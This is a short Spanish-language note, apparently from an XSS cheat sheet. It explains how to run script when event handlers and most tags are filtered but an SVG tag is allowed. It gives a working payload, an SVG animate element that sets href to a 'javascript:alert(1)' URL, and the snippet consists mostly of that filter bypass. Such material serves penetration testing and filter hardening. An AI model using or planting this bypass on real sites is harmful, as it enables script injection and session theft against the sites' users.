Cuando todos los eventos y etiquetas están bloqueados, pero hay alguna etiqueta de svg podemos usar el atributo ("attributeName"), ejemplo:

```html
<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
```